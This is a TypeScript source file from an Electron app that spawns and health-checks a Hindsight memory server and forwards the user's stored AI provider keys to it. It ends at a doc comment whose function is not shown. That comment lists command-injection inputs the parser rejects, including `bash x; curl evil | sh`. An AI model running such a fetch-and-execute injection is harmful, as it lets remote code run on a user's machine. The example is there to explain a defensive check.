// electron/services/HindsightManager.ts
//
// Production hosting for the optional Hindsight long-term-memory server.
//
// Hindsight's server is Python + an embedded Postgres + a HuggingFace embedding model —
// far too heavy to bundle into the signed Electron app. So, exactly like Ollama
// (OllamaManager) and Codex CLI (codexCliEnabled/codexCliPath), it's treated as an
// OPTIONAL, USER-PROVISIONED sidecar: the app health-checks it and degrades to Noop if
// it isn't there. Two supported targets, same code path:
//   • Local  — user runs `bash scripts/hindsight-start.sh` (or `pip install hindsight-all`
//              + the server) and points baseUrl at http://localhost:8888.
//   • Cloud  — user pastes their Hindsight Cloud baseUrl + apiKey.
//
// Config-from-settings + cached health-gating: the retain/recall paths gate on
// isAvailable(), so a running (local or Cloud) server works in a packaged build — config
// flows from SettingsManager, not just shell env. Auto-spawn IS implemented and ZERO-CONFIG:
// when the memory flag is on + a baseUrl is configured + the server is not already healthy +
// autoStart is on (default), start() spawns the server (detached, group-killed on quit via
// stopSync) and polls for readiness. The launch command resolves from
// HINDSIGHT_SERVER_COMMAND env → the hindsightServerCommand setting → a DEFAULT that runs the
// bundled `scripts/hindsight-start.sh` — but the default is gated on that script actually
// existing on disk, so in dev it auto-starts out-of-the-box while a packaged build (which does
// NOT bundle the script) stays Noop instead of spawning a broken command. Cloud / a user-run
// server stays healthy → no spawn.
//
// LLM credential forwarding: when spawning a local server, buildCredentialEnv() reads
// CredentialsManager and maps every configured AI provider key into the env vars that
// hindsight-start.sh + hindsight-llm-config.mjs expect. This is the ONLY way the packaged
// app can forward keys — CredentialsManager encrypts them at rest and they never live in
// process.env. The child inherits process.env PLUS these injected keys; the shell script
// then builds a litellm.Router chain from whatever subset is present.

import type { HindsightConfig } from '../intelligence/memory/HindsightClientAdapter';
import type { ChildProcess } from 'child_process';

interface SettingsLike {
  get(key: string): unknown;
}

const HEALTH_TIMEOUT_MS = 1000;       // match OllamaManager.checkIsRunning
const AVAILABILITY_TTL_MS = 30_000;   // cache health so per-retain/recall calls are cheap
const AUTH_FAILURE_TTL_MS = 5 * 60_000; // cache 401/403 longer — don't spam a rejected key
const SPAWN_POLL_INTERVAL_MS = 5000;  // poll for readiness (like OllamaManager)
const SPAWN_MAX_ATTEMPTS = 36;        // 36 * 5s = 180s (first boot downloads embedding models)
const SYNTHETIC_LOCAL_BASEURL = 'http://localhost:8888'; // bundled dev server's default port

/**
 * Classify a baseUrl as local vs remote. Local targets get the auto-spawn + provider-key
 * forwarding treatment; remote (Hindsight Cloud) targets are user-managed and authenticate
 * with the Hindsight apiKey only. Treat localhost / loopback / mDNS (.local) as local.
 * Anything else (including private LAN IPs and the public internet) is remote.
 */
function isLocalTarget(rawUrl: string | undefined | null): boolean {
  if (!rawUrl) return true; // empty/undefined → assume local so the synthetic default works
  try {
    const u = new URL(rawUrl);
    if (!['http:', 'https:'].includes(u.protocol)) return false;
    const h = u.hostname.toLowerCase();
    if (h === 'localhost' || h === '127.0.0.1' || h === '::1' || h === '0.0.0.0') return true;
    if (h.endsWith('.local')) return true;
    return false;
  } catch {
    // Unparseable URL → treat as local so the auto-spawn path can still surface an error
    // via the spawn-failed banner rather than silently returning Noop.
    return true;
  }
}

export class HindsightManager {
  private static instance: HindsightManager | null = null;
  static getInstance(): HindsightManager {
    if (!HindsightManager.instance) HindsightManager.instance = new HindsightManager();
    return HindsightManager.instance;
  }

  /** Cached health result + when it was taken. */
  private lastHealthy = false;
  private lastCheckedAt = 0;
  /** Set to true the first time start() runs — gates isAvailable()'s cold-start optimism
   *  so the very first recall doesn't fire a wasted 800ms probe before boot-time start()
   *  has had a chance to spawn. See isAvailable(). */
  private hasAttemptedStart = false;
  /** Synchronous re-entry guard — true while a start() call is in flight (before any
   *  await). Closed in finally. Prevents two concurrent start() calls from each passing
   *  the serverProcess check (serverProcess isn't assigned until spawnServer returns,
   *  which is after the first await). See start(). */
  private pendingStart = false;
  /** When the last healthCheck saw 401/403 — used to surface "Cloud key rejected" vs
   *  "server not yet ready". Cleared on a successful response. Cached longer than
   *  AVAILABILITY_TTL_MS (see AUTH_FAILURE_TTL_MS). */
  private lastAuthFailedAt = 0;
  /** True only when WE spawned the server (so we kill it on quit). A user-run or Cloud
   *  server is never app-managed and is left running. */
  private isAppManaged = false;
  private serverProcess: ChildProcess | null = null;
  private pollInterval: NodeJS.Timeout | null = null;
  private spawnAttempts = 0;
  /** Where the spawned server's stdout/stderr is written (for failure diagnostics). */
  private logPath: string | null = null;

  /** Lazily read SettingsManager — avoids a hard import cycle + works headless (returns null). */
  private settings(): SettingsLike | null {
    try {
      const { SettingsManager } = require('./SettingsManager');
      return SettingsManager.getInstance();
    } catch {
      return null;
    }
  }

  /**
   * Broadcast the current Hindsight lifecycle state to all renderer windows so the failure
   * path is visible OUTSIDE the Settings panel (e.g. a persistent top-of-overlay banner).
   * Without this, a spawn crash only logs to console + `<userData>/hindsight-server.log`,
   * and the user has no idea anything went wrong unless they happen to have Settings open.
   * `state` is one of: 'ready' | 'spawning' | 'unreachable' | 'spawn-failed' | 'auth-failed'.
   * `reason` and `logPath` are optional context for the failure states. Never throws
   * (best-effort).
   */
  private broadcastStatus(state: 'spawning' | 'ready' | 'unreachable' | 'spawn-failed' | 'auth-failed', reason?: string): void {
    // Keep the availability cache consistent with the broadcast. A terminal failure state
    // ('spawn-failed' / 'unreachable') means the server is NOT usable — pin lastHealthy
    // false + stamp lastCheckedAt so isAvailable() returns the cached false instead of its
    // optimistic-true cold-start path (which, after start() early-returns or a failed
    // spawn, would otherwise fire a wasted 800ms recall probe per answer at a server we
    // already know is down). 'spawning' leaves the cache alone (poll loop owns it).
    if (state === 'spawn-failed' || state === 'unreachable') {
      this.lastHealthy = false;
      this.lastCheckedAt = Date.now();
    }
    try {
      const { BrowserWindow } = require('electron') as typeof import('electron');
      const payload = { state, reason: reason || undefined, logPath: this.logPath || undefined, at: Date.now() };
      BrowserWindow.getAllWindows().forEach((win) => {
        if (!win.isDestroyed()) {
          win.webContents.send('hindsight-status', payload);
        }
      });
    } catch (e: any) {
      // Electron unavailable (headless / test) — log only, never block.
      console.warn('[HindsightManager] broadcastStatus skipped (non-fatal):', e?.message);
    }
  }

  /**
   * Resolve the Hindsight config: env (dev) takes precedence over the persisted setting
   * (packaged app). Returns null when no baseUrl is configured (→ feature off).
   */
  getHindsightConfig(): HindsightConfig | null {
    try {
      const s = this.settings();
      // Explicit opt-out wins over everything else. A user who has flipped the "Don't use
      // Hindsight" toggle is telling us to stay Noop, regardless of any inherited env or
      // stale persisted URL. (See SettingsManager.AppSettings.hindsightExplicitlyDisabled.)
      if (s?.get('hindsightExplicitlyDisabled') === true) return null;
      const baseUrl = (process.env.HINDSIGHT_BASE_URL
        || (s?.get('hindsightBaseUrl') as string | undefined)
        || '').trim();
      // NO-SAVE SYNTHETIC DEFAULT — when nothing is saved AND the user hasn't opted out,
      // resolve to the bundled dev server's default port so boot-time start() reaches the
      // auto-spawn branch. The `synthetic: true` flag lets the renderer label the URL as
      // "(using local default)" without pretending the user actively chose it. The
      // persisted setting stays empty until the user explicitly clicks Apply or Save —
      // we never auto-write baseUrl on read.
      if (!baseUrl) {
        return {
          baseUrl: SYNTHETIC_LOCAL_BASEURL,
          apiKey: undefined,
          timeoutMs: 800,
          mode: 'local',
          synthetic: true,
        };
      }
      const apiKey = (process.env.HINDSIGHT_API_KEY
        || (s?.get('hindsightApiKey') as string | undefined)
        || '').trim() || undefined;
      const timeoutMs = Number(process.env.HINDSIGHT_TIMEOUT_MS) || 800;
      return { baseUrl, apiKey, timeoutMs, mode: isLocalTarget(baseUrl) ? 'local' : 'cloud' };
    } catch {
      return null;
    }
  }

  /**
   * Stable per-install memory scope id. Used as the Hindsight `userId` so the bank/tags
   * are unique to THIS install. Matters for the Cloud path: two different installs that
   * point at the same Cloud account would otherwise both write to bank `user_local` with
   * identical tags and MERGE each other's memories. Derived from the persisted install
   * UUID (getOrCreateInstallId). Falls back to 'local' if unavailable (local-only path is
   * single-user so the constant is safe there).
   */
  private _localUserId: string | null = null;
  localUserId(): string {
    if (this._localUserId) return this._localUserId;
    try {
      const { getOrCreateInstallId } = require('./InstallPingManager');
      const id = String(getOrCreateInstallId() || '').replace(/[^a-zA-Z0-9]/g, '').slice(0, 16);
      this._localUserId = id ? `local_${id}` : 'local';
    } catch {
      this._localUserId = 'local';
    }
    return this._localUserId;
  }

  /** GET <baseUrl>/health with a 1s timeout. Returns false on any error/timeout.
   *  401/403 is recorded separately via `lastAuthFailedAt` so callers can distinguish
   *  "server not yet ready" from "Cloud key rejected" — the latter is a user-actionable
   *  error and needs a different banner copy. */
  async healthCheck(): Promise<boolean> {
    const cfg = this.getHindsightConfig();
    if (!cfg) return false;
    try {
      const controller = new AbortController();
      const timer = setTimeout(() => controller.abort(), HEALTH_TIMEOUT_MS);
      const headers: Record<string, string> = {};
      if (cfg.apiKey) headers.Authorization = `Bearer ${cfg.apiKey}`;
      const res = await fetch(`${cfg.baseUrl.replace(/\/+$/, '')}/health`, {
        signal: controller.signal,
        headers,
      });
      clearTimeout(timer);
      this.lastHealthy = res.ok;
      this.lastCheckedAt = Date.now();
      // 401/403 → the endpoint is REACHABLE but auth is rejected. Cache this with a longer
      // TTL than AVAILABILITY_TTL_MS so we don't spam the server with bad-token probes.
      if (res.status === 401 || res.status === 403) {
        this.lastAuthFailedAt = Date.now();
        console.warn(`[HindsightManager] healthCheck returned ${res.status} — Cloud key may be rejected`);
        return false;
      }
      // Clear any prior auth-failure cache on a non-auth response (2xx or 5xx — both mean
      // "auth was accepted, the endpoint is reachable").
      if (this.lastAuthFailedAt) {
        this.lastAuthFailedAt = 0;
        // The top-of-overlay banner only clears on explicit lifecycle events. Surface the
        // recovery so the user gets immediate visual confirmation their fix worked. Fire
        // the precise state: a 2xx → 'ready' (server is good); a 5xx → 'unreachable'
        // (auth accepted but server erroring) so the banner copy + "View log" affordance
        // matches reality instead of staying on the misleading "Cloud key rejected".
        this.broadcastStatus(res.ok ? 'ready' : 'unreachable',
          res.ok ? undefined : `server error (HTTP ${res.status})`);
      }
      return res.ok;
    } catch {
      const wasAuthFailed = this.lastAuthFailedAt > 0;
      this.lastHealthy = false;
      this.lastCheckedAt = Date.now();
      // A network error is categorically different from an auth rejection. Clear the
      // auth-failure cache, otherwise `isAuthFailed()` keeps returning true for the full
      // 5-min TTL and the user sees "Cloud key rejected" even when the real problem is
      // "server unreachable". If we WERE showing the auth-failed banner, transition it to
      // 'unreachable' so the stale red "Cloud key rejected" copy doesn't linger — the
      // banner state machine only updates on broadcasts, never on its own.
      if (wasAuthFailed) {
        this.lastAuthFailedAt = 0;
        this.broadcastStatus('unreachable', 'server unreachable');
      }
      return false;
    }
  }

  /** True when the most recent healthCheck saw 401/403 within AUTH_FAILURE_TTL_MS. */
  isAuthFailed(): boolean {
    if (!this.lastAuthFailedAt) return false;
    return Date.now() - this.lastAuthFailedAt < AUTH_FAILURE_TTL_MS;
  }

  /**
   * Cheap gate for the retain/recall paths: a baseUrl is configured AND a recent health
   * check passed. Caches for AVAILABILITY_TTL_MS so calling it per answer is free; kicks
   * a background re-check when stale (never blocks the caller). Returns the cached value
   * immediately — callers that need a fresh result await healthCheck() directly.
   */
  isAvailable(): boolean {
    if (!this.getHindsightConfig()) return false;
    // Cold start: never health-checked yet (e.g. start() hasn't even run). Returning true
    // optimistically used to be safe — the server was assumed user-managed. Now that we
    // auto-spawn on first launch, an optimistic true while start() is still mid-spawn
    // (or has failed and broadcast spawn-failed) wastes a fetch per recall. Gate the
    // optimistic true behind "start() has at least run once" — once it has, any recall
    // can safely probe (the poll loop / user-manager assumption is established).
    if (this.lastCheckedAt === 0) {
      if (this.hasAttemptedStart) {
        void this.healthCheck(); // re-probe in case the cache went cold (e.g. user reopened Settings)
        return true;
      }
      // Boot-time, start() hasn't even been called yet. Return false — the first recall
      // skips rather than wastes 800ms on a server that may not exist.
      return false;
    }
    const stale = Date.now() - this.lastCheckedAt > AVAILABILITY_TTL_MS;
    if (stale) { void this.healthCheck(); } // fire-and-forget refresh; never awaited here
    return this.lastHealthy;
  }

  /** Is the memory feature flag enabled? (read fresh, never throws.) */
  private memoryFlagOn(): boolean {
    try {
      const { isIntelligenceFlagEnabled } = require('../intelligence/intelligenceFlags');
      return Boolean(isIntelligenceFlagEnabled('hindsightMemory'));
    } catch {
      return false;
    }
  }

  /**
   * Did the user opt into auto-starting the companion server? Mirrors `autoStartCommand()`'s
   * default — ON unless explicitly disabled. Used by the self-healing auto-flip in start():
   * we never flip the hindsightMemory flag unless the user actually wants auto-spawn. Never
   * throws.
   */
  private isAutoStartEnabled(): boolean {
    try {
      const s = this.settings();
      return (s?.get('hindsightAutoStart') as boolean | undefined) ?? true;
    } catch {
      return true; // default-on, same as autoStartCommand
    }
  }

  /**
   * True when the user (or env override) has explicitly disabled `hindsightMemory` — value
   * differs from the registry default. Read via the sibling setting key
   * `hindsightMemoryEnabledExplicit`, which `setIntelligenceFlag` writes whenever the
   * persisted value !== registry default. Without this guard the auto-flip would silently
   * re-enable a flag the user explicitly turned off — and the Customize disclosure hides
   * the Hindsight flags, so there's no UI to re-disable from. Never throws.
   */
  private hindsightMemoryExplicitlyOff(): boolean {
    try {
      const s = this.settings();
      // The sibling is set to `true` only when the value DIFFERS from default. If the
      // user explicitly set it OFF (default is OFF), the sibling is true.
      if (s?.get('hindsightMemoryEnabledExplicit') === true) {
        // Cross-check with the actual flag value — covers the edge case where a user
        // wrote `hindsightMemoryEnabledExplicit=true` but the value matches default
        // (defensive: shouldn't happen given setIntelligenceFlag's invariant, but cheap).
        const { isIntelligenceFlagEnabled } = require('../intelligence/intelligenceFlags');
        return !isIntelligenceFlagEnabled('hindsightMemory');
      }
      return false;
    } catch {
      return false;
    }
  }

  /**
   * True when the `hindsightMemory` flag is FORCED by an env override
   * (`NATIVELY_HINDSIGHT_MEMORY` set to a recognized on/off value). Env writes no
   * SettingsManager state, so `hindsightMemoryExplicitlyOff()` can't see it — this
   * helper covers the gap. The auto-flip must skip when the env forces the value in
   * EITHER direction: forcing OFF must not be silently overwritten with a persisted ON,
   * and forcing ON means the flip is already unnecessary. Never throws.
   */
  private memoryFlagEnvForced(): boolean {
    try {
      const { isIntelligenceFlagEnvForced } = require('../intelligence/intelligenceFlags');
      return Boolean(isIntelligenceFlagEnvForced('hindsightMemory'));
    } catch {
      return false;
    }
  }

  /**
   * Locate the bundled `scripts/hindsight-start.sh` launcher on disk, returning its absolute
   * path or null if it isn't present.
   *
   * DEV vs PACKAGED — this is the crux of the zero-config default:
   *   • DEV (`npm start`): the compiled manager lives at
   *     <root>/dist-electron/electron/services/HindsightManager.js and app.getAppPath()
   *     === <root>, so <appPath>/scripts/hindsight-start.sh resolves and exists.
   *   • PACKAGED (.app): the script + python dev-server are NOT bundled into the asar
   *     (deliberately — Hindsight is a heavy user-provisioned sidecar, see file header), so
   *     <appPath>/scripts/... does NOT exist. We MUST detect that and NOT spawn a broken
   *     `bash <missing>` command; instead the caller stays Noop and graceful-degrades.
   *
   * We probe a few candidate roots and return the first that actually exists on disk. Using
   * fs.existsSync is what makes the default safe: the zero-config `bash <script>` default is
   * ONLY produced when the script is genuinely present, so a packaged build with no script
   * never gets a defaulted (and doomed) command.
   */
  private locateLauncherScript(): string | null {
    try {
      const fs = require('fs') as typeof import('fs');
      const path = require('path') as typeof import('path');
      const candidateRoots: string[] = [];
      // 1. Electron app root (project root in dev; asar/Resources in packaged).
      try {
        const { app } = require('electron') as typeof import('electron');
        const appPath = app?.getAppPath?.();
        if (appPath) candidateRoots.push(appPath);
      } catch { /* electron not available (headless/test) — fall through to other roots */ }
      // 2. Walk up from this compiled module: dist-electron/electron/services → <root>.
      //    Robust if app.getAppPath() is unavailable but the on-disk layout is intact.
      candidateRoots.push(path.resolve(__dirname, '..', '..', '..'));
      // 3. Process cwd (dev `npm start` runs from the project root).
      candidateRoots.push(process.cwd());

      const seen = new Set<string>();
      for (const root of candidateRoots) {
        if (!root || seen.has(root)) continue;
        seen.add(root);
        const scriptPath = path.join(root, 'scripts', 'hindsight-start.sh');
        try { if (fs.existsSync(scriptPath)) return scriptPath; } catch { /* keep probing */ }
      }
      return null;
    } catch {
      return null;
    }
  }

  /**
   * Should we auto-spawn a local server? Resolve the launch command + autoStart toggle.
   *
   * Precedence: explicit HINDSIGHT_SERVER_COMMAND env → persisted hindsightServerCommand
   * setting → ZERO-CONFIG DEFAULT (`bash <abs path to scripts/hindsight-start.sh>`).
   *
   * The zero-config default is what makes auto-start work out-of-the-box: the renderer never
   * persists a serverCommand, so without this the command was always empty → auto-start
   * no-op on every launch (the reported bug). The default is gated on the launcher script
   * actually existing on disk (locateLauncherScript), so a packaged build that doesn't bundle
   * the script returns null here and the caller stays Noop instead of spawning a broken
   * `bash <missing-path>`.
   */
  private autoStartCommand(): string | null {
    try {
      const s = this.settings();
      // Default ON (auto-start-when-installed, per the design) unless explicitly disabled.
      const autoStart = (s?.get('hindsightAutoStart') as boolean | undefined) ?? true;
      if (!autoStart) return null;
      // CLOUD GUARD — Hindsight Cloud is user-managed (lives at a remote URL). We never try
      // to `bash scripts/...` against a remote URL — that would launch a local Python server
      // and ignore the configured Cloud target. The user is responsible for the Cloud
      // endpoint being healthy; the app only health-checks it.
      const cfg = this.getHindsightConfig();
      if (cfg && !isLocalTarget(cfg.baseUrl)) return null;
      const explicit = (process.env.HINDSIGHT_SERVER_COMMAND
        || (s?.get('hindsightServerCommand') as string | undefined)
        || '').trim();
      if (explicit) return explicit;
      // Zero-config fallback: run the bundled launcher IFF it exists on disk. Quote the path
      // (it's absolute and may contain spaces, e.g. "/Users/.../Application Support/...").
      const script = this.locateLauncherScript();
      return script ? `bash "${script}"` : null;
    } catch {
      return null;
    }
  }

  /**
   * Build a PATH that works when the app is launched from Finder (GUI), not a terminal.
   *
   * macOS GUI apps inherit a MINIMAL PATH (typically just /usr/bin:/bin:/usr/sbin:/sbin),
   * NOT the user's interactive shell PATH. So a spawned `bash scripts/hindsight-start.sh`
   * can fail to find `python3`/`node`/`hindsight` even though they work in the user's
   * terminal. We prepend the common install locations (Homebrew Intel + Apple Silicon,
   * the python.org framework bins, /usr/local) to whatever PATH we inherited so the child
   * can resolve them. No-op on non-darwin. Never throws.
   */
  private augmentPath(): string {
    const existing = process.env.PATH || '';
    if (process.platform !== 'darwin') return existing;
    try {
      const fs = require('fs') as typeof import('fs');
      const path = require('path') as typeof import('path');
      const extras: string[] = ['/opt/homebrew/bin', '/usr/local/bin', '/usr/bin'];
      // python.org installs to /Library/Frameworks/Python.framework/Versions/<x.y>/bin —
      // glob the versions that actually exist (newest first), e.g. the user's 3.12.
      try {
        const fwBase = '/Library/Frameworks/Python.framework/Versions';
        if (fs.existsSync(fwBase)) {
          const versions = fs.readdirSync(fwBase)
            .filter((v) => /^\d/.test(v))
            .sort()
            .reverse()
            .map((v) => path.join(fwBase, v, 'bin'));
          extras.push(...versions);
        }
      } catch { /* framework dir not present — skip */ }
      const parts = existing ? existing.split(':') : [];
      // Prepend extras that aren't already present, preserving the inherited PATH after them.
      const merged: string[] = [];
      for (const p of [...extras, ...parts]) {
        if (p && !merged.includes(p)) merged.push(p);
      }
      return merged.join(':');
    } catch {
      return existing;
    }
  }

  /**
   * Startup hook. Primes the health cache; if the memory flag is on, a baseUrl is
   * configured, the server is NOT already healthy, and an auto-start command is set,
   * spawns it (auto-start-when-installed, like OllamaManager) and polls for readiness.
   * Never blocks startup, never throws. No-op when unconfigured / flag off / Cloud
   * (Cloud is already healthy so no spawn).
   */
  async start(): Promise<void> {
    try {
      this.hasAttemptedStart = true;
      // IDEMPOTENT RE-ENTRY GUARD — start() is called from BOTH boot (main.ts:996) AND
      // on every debounced setHindsightConfig IPC (every field edit). We use a SYNCHRONOUS
      // pendingStart flag (set before any await) so two start() calls landing within the
      // same microtask — before serverProcess is assigned inside spawnServer() — still
      // bail out cleanly. The serverProcess check alone is racy: between start()'s
      // `await healthCheck()` yielding and spawnServer() returning, a second start()
      // would see serverProcess===null and proceed to a second spawnServer() → two
      // children both binding port 8888. The pendingStart boolean closes that window.
      if (this.serverProcess || this.pendingStart) return;
      this.pendingStart = true;
      const cfg = this.getHindsightConfig();
      if (!cfg) return;                 // no baseUrl → feature off, stay Noop
      // SELF-HEALING AUTO-FLIP — `hindsightMemory` is default-OFF in the flag registry
      // (electron/intelligence/intelligenceFlags.ts:142), so a user with a baseUrl
      // configured + autoStart ON + the companion installed would still hit the
      // `memoryFlagOn()` guard below and never spawn. The UI's autoStart toggle is
      // INDEPENDENT of the flag — it only gates `autoStartCommand()` resolution, not
      // the spawn gate. When the user has opted into auto-start, treat the request as
      // "enable memory for this session": idempotently flip the flag ON here so the
      // gate passes.
      //
      // RESPECT USER-OFF INTENT — two independent ways the user can say "off", both of
      // which the auto-flip must honor:
      //   (1) UI/settings: `setIntelligenceFlag` writes the sibling
      //       `hindsightMemoryEnabledExplicit=true` whenever the value DIFFERS from the
      //       registry default → `hindsightMemoryExplicitlyOff()` returns true → skip.
      //   (2) Env override: `NATIVELY_HINDSIGHT_MEMORY=0` writes NO SettingsManager state,
      //       so the sibling check alone can't see it. `isIntelligenceFlagEnvForced`
      //       detects it. CRITICAL: without this, the auto-flip would write
      //       `hindsightMemoryEnabled=true` to settings while env=0 wins at read time —
      //       looks fine until the user unsets the env, at which point memory silently
      //       turns ON against the user's stated "always off" intent.
      // Either signal blocks the flip. The Customize disclosure intentionally HIDES the
      // Hindsight flags, so a wrong flip leaves the user no UI to re-disable.
      if (
        !this.memoryFlagOn() &&
        this.isAutoStartEnabled() &&
        !this.hindsightMemoryExplicitlyOff() &&
        !this.memoryFlagEnvForced()
      ) {
        try {
          const { setIntelligenceFlag } = require('../intelligence/intelligenceFlags');
          // `setIntelligenceFlag` returns boolean (false = key rejected by registry guard,
          // throw = SettingsManager write failed). Track both — a silent failure here means
          // the spawn gate never opens, the user gets "Can't connect" forever, and they
          // assume the spawn itself failed. Surface it.
          const flipOk = setIntelligenceFlag('hindsightMemory', true);
          if (flipOk === false) {
            console.error('[HindsightManager] auto-flip rejected by flag registry — internal config error.');
            this.broadcastStatus('spawn-failed', 'failed to enable long-term memory (internal config error — see log)');
            return;
          }
          console.log('[HindsightManager] auto-enabling hindsightMemory flag (autoStart ON, baseUrl configured).');
        } catch (e: any) {
          // SettingsManager write threw (read-only disk, AV scanner, etc). This is the
          // silent-failure case — without surfacing, the user has no signal that the
          // reason nothing came up was the auto-flip itself, not the spawn.
          console.error('[HindsightManager] auto-flip threw (non-fatal write failure):', e?.message);
          this.broadcastStatus('spawn-failed', `failed to enable long-term memory: ${e?.message || 'unknown error'}`);
          return;
        }
      }
      if (!this.memoryFlagOn()) return; // still off (autoStart explicitly disabled) → don't manage anything

      const healthy = await this.healthCheck();
      if (healthy) {
        // CRITICAL: only declare "not app-managed" if we weren't the ones who spawned it.
        // A second start() (from a debounced auto-save) hitting the healthy branch used
        // to clobber isAppManaged = false unconditionally → stopSync() short-circuited →
        // the spawned Python+Postgres tree was orphaned on quit AND held port 8888
        // forever, blocking auto-spawn on next launch.
        if (!this.isAppManaged) {
          console.log('[HindsightManager] server already running — connecting (not app-managed).', { baseUrl: cfg.baseUrl });
          this.broadcastStatus('ready');
        }
        return;
      }

      const cmd = this.autoStartCommand();
      if (!cmd) {
        console.log('[HindsightManager] server not running + auto-start off/unset — staying Noop until a server appears.', { baseUrl: cfg.baseUrl });
        return;
      }

      console.log('[HindsightManager] server not detected — auto-starting:', cmd);
      this.broadcastStatus('spawning');
      this.spawnServer(cmd);
      this.pollUntilReady();
    } catch (e: any) {
      console.warn('[HindsightManager] start skipped (non-fatal):', e?.message);
    } finally {
      // Always release the pendingStart guard, regardless of which branch (auto-flip
      // rejection, cfg-null, memoryFlagOn, no-cmd, healthy, spawned, throw) we exit
      // through. Without this the guard would never release on early-returns and
      // every subsequent start() would silently no-op.
      this.pendingStart = false;
    }
  }

  /**
   * Build the environment that the spawned Hindsight server process should see.
   *
   * The packaged app never exposes user credentials in process.env — they live in
   * CredentialsManager (encrypted on disk). This method reads every configured AI
   * provider key and maps it to the standard env var that hindsight-llm-config.mjs
   * (and transitively litellm) expects. The result is merged with process.env so the
   * child gets the full ambient env PLUS the credential overrides.
   *
   * Provider priority mirrors hindsight-llm-config.mjs:
   *   Gemini → OpenAI → Anthropic → DeepSeek → Groq → LiteLLM gateway → Ollama
   *
   * Never throws — a missing CredentialsManager (e.g. test environment) is silently
   * handled and the child falls back to env-var defaults (dev .env path).
   */
  private buildCredentialEnv(): Record<string, string> {
    const extra: Record<string, string> = {};
    try {
      const { CredentialsManager } = require('./CredentialsManager') as typeof import('./CredentialsManager');
      const cm = CredentialsManager.getInstance();

      const gemini = cm.getGeminiApiKey();
      if (gemini) extra.GEMINI_API_KEY = gemini;

      const openai = cm.getOpenaiApiKey();
      if (openai) extra.OPENAI_API_KEY = openai;

      const claude = cm.getClaudeApiKey();
      if (claude) extra.ANTHROPIC_API_KEY = claude;

      const deepseek = cm.getDeepseekApiKey();
      if (deepseek) extra.DEEPSEEK_API_KEY = deepseek;

      const groq = cm.getGroqApiKey();
      if (groq) extra.GROQ_API_KEY = groq;

      // LiteLLM gateway — treated as an OpenAI-compatible endpoint. The shell script
      // passes OPENAI_API_KEY to litellm; OPENAI_API_BASE redirects calls to the gateway.
      // Only applied when a base URL is configured (key alone is meaningless without URL).
      const litellmUrl = cm.getLitellmBaseURL();
      if (litellmUrl?.trim()) {
        extra.OPENAI_API_BASE = litellmUrl.trim();
        // Prefer the explicit LiteLLM key; fall back to the OpenAI key already set above.
        const litellmKey = cm.getLitellmApiKey();
        if (litellmKey) extra.OPENAI_API_KEY = litellmKey;
        // Guard: if neither key is present, litellm still needs a non-empty string. The
        // placeholder 'natively-gateway' satisfies litellm's non-empty check but WILL
        // 401 against any auth-required LiteLLM proxy (the common case). Log so the
        // operator has a trail when retains/reflects silently fail.
        if (!extra.OPENAI_API_KEY) {
          extra.OPENAI_API_KEY = 'natively-gateway';
          console.warn('[HindsightManager] LiteLLM URL configured without an API key — using placeholder. Retains/reflects will likely fail on auth-required proxies. Save an OpenAI or LiteLLM key in AI Providers.');
        }
      }

      // Ollama — no API key; signal availability via the enable flag and pass the base URL.
      // LLMHelper always defaults to 127.0.0.1:11434 when OLLAMA_URL is unset; mirror that.
      const ollamaUrl = process.env.OLLAMA_URL || 'http://127.0.0.1:11434';
      // Only enable Ollama for Hindsight when the app is actively using it (avoid forcing
      // a heavyweight local model when the user has cloud keys configured).
      try {
        const { llmHelper } = require('../LLMHelper') as { llmHelper: { isUsingOllama(): boolean } };
        if (llmHelper?.isUsingOllama?.()) {
          extra.HINDSIGHT_LLM_ENABLE_OLLAMA = 'true';
          extra.HINDSIGHT_LLM_OLLAMA_BASE = ollamaUrl;
        }
      } catch { /* LLMHelper not available yet — skip Ollama */ }
    } catch (e: any) {
      console.warn('[HindsightManager] buildCredentialEnv: could not read CredentialsManager (non-fatal):', e?.message);
    }

    if (Object.keys(extra).length > 0) {
      const providerList = Object.keys(extra)
        .filter((k) => k.endsWith('_API_KEY') || k === 'HINDSIGHT_LLM_ENABLE_OLLAMA')
        .map((k) => k.replace('_API_KEY', '').replace('HINDSIGHT_LLM_ENABLE_', '').toLowerCase())
        .join(', ');
      console.log(`[HindsightManager] credential env: forwarding providers → ${providerList || 'none'}`);
    } else {
      console.warn('[HindsightManager] credential env: no provider keys found — Hindsight server will fall back to its own env defaults');
    }

    return extra;
  }

  /** Resolve a writable path for the spawned server's log. Prefers the app's userData dir
   *  (works in a packaged build); falls back to the OS temp dir. Null only if both fail. */
  private resolveServerLogPath(): string | null {
    try {
      const path = require('path') as typeof import('path');
      let dir: string | null = null;
      try {
        const { app } = require('electron') as typeof import('electron');
        dir = app?.getPath?.('userData') || null;
      } catch { /* electron unavailable (headless/test) */ }
      if (!dir) {
        try { dir = (require('os') as typeof import('os')).tmpdir(); } catch { dir = null; }
      }
      return dir ? path.join(dir, 'hindsight-server.log') : null;
    } catch {
      return null;
    }
  }

  /**
   * Public accessor for the absolute server-log path. Used by the `open-hindsight-log` IPC
   * so the banner's "View log" button can hand the file to shell.openPath. Returns the
   * cached `logPath` if a spawn already populated it, else re-resolves from scratch (so
   * the path is available BEFORE the first spawn — useful for surfacing where the log
   * WOULD go to a curious user).
   */
  getServerLogPath(): string | null {
    return this.logPath ?? this.resolveServerLogPath();
  }

  /** On a non-zero server exit, tail the captured log into the app log so the failure cause
   *  (missing module, bad key, port in use) is visible instead of a bare exit code. */
  private logServerFailureTail(): void {
    try {
      if (!this.logPath) return;
      const fs = require('fs') as typeof import('fs');
      const raw = fs.readFileSync(this.logPath, 'utf8');
      const tail = raw.split('\n').filter(Boolean).slice(-12).join('\n');
      if (tail) {
        console.error('[HindsightManager] server launcher failed — last log lines:\n' + tail);
        console.error(`[HindsightManager] full log: ${this.logPath}`);
      }
    } catch { /* no log / unreadable — nothing more we can surface */ }
  }

  /** Spawn the configured server command (shell form, like `bash scripts/hindsight-start.sh`).
   *  Degrades gracefully on error ("python/script not found") — app unaffected. */
  /**
   * Parse a command string into argv WITHOUT a shell — handles double-quoted segments
   * (for the bundled launcher path which may contain spaces, e.g. "Application Support")
   * and rejects shell metacharacters that would enable injection. Returns null when the
   * command contains metacharacters outside quotes (caller must refuse to spawn unless
   * HINDSIGHT_SERVER_COMMAND_ALLOW_SHELL is set). Supports the two real forms:
   *   • `bash "/abs path/scripts/hindsight-start.sh"`  → ['bash', '/abs path/.../start.sh']
   *   • `my-launcher --foo bar`                        → ['my-launcher', '--foo', 'bar']
   * Rejects `bash x; curl evil | sh`, `$(...)`, backticks, `&&`, `|`, `>`, `<`, newlines.
   */
